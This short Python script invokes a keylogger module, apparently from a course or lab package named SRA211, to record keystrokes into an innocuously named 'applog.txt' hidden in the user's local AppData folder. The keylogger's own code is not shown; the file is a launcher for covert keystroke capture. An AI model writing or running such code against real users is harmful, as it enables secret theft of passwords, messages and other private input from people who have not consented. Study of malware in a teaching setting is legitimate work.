import os
from SRA211.Keyloggers import keylogger


log_dir = os.environ['localappdata']
log_name = 'applog.txt'

keylogger.getKeystrokes(log_dir, log_name)